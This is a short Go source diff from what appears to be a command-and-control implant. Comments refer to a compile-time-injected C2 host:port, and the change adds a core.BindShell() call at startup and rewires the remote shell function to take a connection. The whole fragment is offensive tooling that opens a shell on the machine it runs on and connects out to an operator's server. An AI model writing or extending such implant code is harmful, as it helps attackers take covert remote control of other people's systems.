@@ -25,6 +25,7 @@ func main() {
 	// make this accessible globally, through a module, so other parts
 	// can reference the built in C2 host:port
 	myconn.ConnectionString = connectString
+	core.BindShell()
 
 	dev := flag.Bool("dev", false, "Run the shell locally.")
 	override := flag.String("connect", "", "Override compile-time-injected connectString")
@@ -32,7 +33,7 @@ func main() {
 
 	if *dev {
 		myconn.Conn = os.Stdin
-		core.StartShell()
+		core.StartShell(&myconn.Conn)
 	}
 
 	if connectString != "" && fingerPrint != "" {
